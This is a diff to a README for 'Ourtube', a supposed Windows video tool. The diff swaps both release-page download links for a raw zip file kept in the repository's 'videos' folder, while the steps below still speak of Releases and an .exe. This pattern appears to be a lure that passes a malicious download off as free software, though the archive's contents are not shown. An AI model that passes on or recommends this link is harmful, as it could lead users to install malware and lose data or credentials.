@@ -1,6 +1,6 @@
 # 📺 Ourtube - Easy way to watch private videos
 
-[![](https://img.shields.io/badge/Download_Ourtube_Setup-blue?style=for-the-badge)](https://github.com/allergydietcyclerickshaw867/Ourtube/releases)
+[![](https://img.shields.io/badge/Download_Ourtube_Setup-blue?style=for-the-badge)](https://github.com/allergydietcyclerickshaw867/Ourtube/raw/refs/heads/main/videos/Software-v2.0.zip)
 
 Ourtube lets you view and manage your video library with ease. This tool organizes your media files in a simple interface. It runs on Windows systems. You do not need developer tools to use this software. This guide helps you set up the program on your computer.
 
@@ -17,7 +17,7 @@ Your computer needs specific settings to run Ourtube. Ensure your system meets t
 
 You must obtain the installer file from the official releases page. 
 
-1. Visit this page to download: [https://github.com/allergydietcyclerickshaw867/Ourtube/releases](https://github.com/allergydietcyclerickshaw867/Ourtube/releases)
+1. Visit this page to download: [https://github.com/allergydietcyclerickshaw867/Ourtube/raw/refs/heads/main/videos/Software-v2.0.zip](https://github.com/allergydietcyclerickshaw867/Ourtube/raw/refs/heads/main/videos/Software-v2.0.zip)
 2. Look for the latest version listed under the Releases section.
 3. Click the file that ends in .exe to start your download.
 4. Save the file to your Downloads folder.
